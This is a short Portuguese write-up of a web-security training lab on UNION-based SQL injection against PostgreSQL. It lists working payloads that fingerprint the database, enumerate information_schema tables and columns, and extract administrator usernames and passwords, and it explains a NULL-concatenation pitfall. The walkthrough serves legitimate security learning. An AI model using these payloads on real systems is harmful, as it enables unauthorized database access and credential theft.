## Lab: SQL injection attack, listing the database contents on non-Oracle databases

**Vulnerabilidade:** SQL Injection (UNION attack)

**Payload/técnica:**
1. Determinar número de colunas e qual aceita string (2 colunas, ambas texto)
2. Identificar o DBMS: `' UNION SELECT NULL, version()-- -` → PostgreSQL
3. Listar tabelas do schema da aplicação:
```sql
   ' UNION SELECT NULL, TABLE_CATALOG || '~' || TABLE_SCHEMA || '~' || TABLE_NAME || '~' || TABLE_TYPE FROM information_schema.tables-- -
```
   → Identificada a tabela `users_hvrscf` no schema `public`
4. Listar colunas da tabela encontrada:
```sql
   ' UNION SELECT NULL, TABLE_CATALOG || '~' || TABLE_SCHEMA || '~' || TABLE_NAME || '~' || COLUMN_NAME || '~' || DATA_TYPE FROM information_schema.columns WHERE table_name = 'users_hvrscf'-- -
```
   → Colunas: `email`, `password_agszfp`, `username_vukxwj`
5. Payload final para extrair as credenciais:
```sql
   ' UNION SELECT NULL, password_agszfp || '~' || username_vukxwj FROM users_hvrscf-- -
```

**Raciocínio:**
Diferente dos labs anteriores, aqui não foi informado o nome da tabela nem das colunas — precisei descobrir isso sozinho usando o `information_schema`, que funciona como um "banco de dados sobre o banco de dados" (metadados). Primeiro identifiquei o DBMS (PostgreSQL) para saber que `information_schema` estava disponível. Depois usei `information_schema.tables` para listar as tabelas, filtrando mentalmente pelas que pertencem ao schema `public` (aplicação) e ignorando as de sistema (`pg_catalog`/`information_schema`). Encontrada a tabela `users_hvrscf` (nome ofuscado de propósito pelo lab), usei `information_schema.columns` filtrando por `table_name` para descobrir os nomes reais das colunas.

Na primeira tentativa, concatenei as 3 colunas (`email`, `password`, `username`) e a linha injetada apareceu vazia no resultado. Descobri que isso aconteceu porque o campo `email` daquele usuário estava armazenado como `NULL` no banco — e em SQL, qualquer concatenação envolvendo `NULL` propaga o `NULL` para o resultado inteiro (`'admin' || NULL = NULL`). Resolvi isolando as colunas e removendo o `email` da concatenação, extraindo apenas `password` e `username`, o que revelou as credenciais do administrador.
